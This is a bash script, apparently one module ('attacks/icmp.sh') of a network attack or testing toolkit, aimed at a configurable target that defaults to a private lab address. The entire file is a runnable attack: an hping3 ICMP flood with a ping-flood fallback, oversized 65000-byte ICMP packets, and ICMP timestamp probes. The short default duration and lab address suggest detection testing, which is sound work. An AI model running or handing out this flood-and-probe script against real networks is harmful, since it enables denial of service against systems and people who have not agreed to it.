#!/usr/bin/env bash
# attacks/icmp.sh — ICMP attack module
# Expected env vars: TARGET, DURATION, VERBOSE
set -euo pipefail

TARGET="${TARGET:-10.10.10.1}"
DURATION="${DURATION:-5}"

echo "[icmp] Starting ICMP attack module → $TARGET"

# 1. ICMP echo flood
if command -v hping3 >/dev/null 2>&1; then
    echo "[icmp] hping3 ICMP flood (${DURATION}s)..."
    timeout "$DURATION" hping3 --icmp --flood "$TARGET" 2>/dev/null || true
else
    echo "[icmp] hping3 not found — falling back to ping flood"
    timeout "$DURATION" ping -f -i 0.1 "$TARGET" 2>/dev/null || true
fi

# 2. Oversized ICMP packet
echo "[icmp] Sending oversized ICMP packet (size=65000)..."
ping -c 3 -s 65000 "$TARGET" 2>/dev/null || true

# 3. ICMP timestamp request (type 13)
if command -v hping3 >/dev/null 2>&1; then
    echo "[icmp] Sending ICMP timestamp requests..."
    hping3 --icmp --icmptype 13 -c 10 "$TARGET" 2>/dev/null || true
fi

echo "[icmp] Module complete."
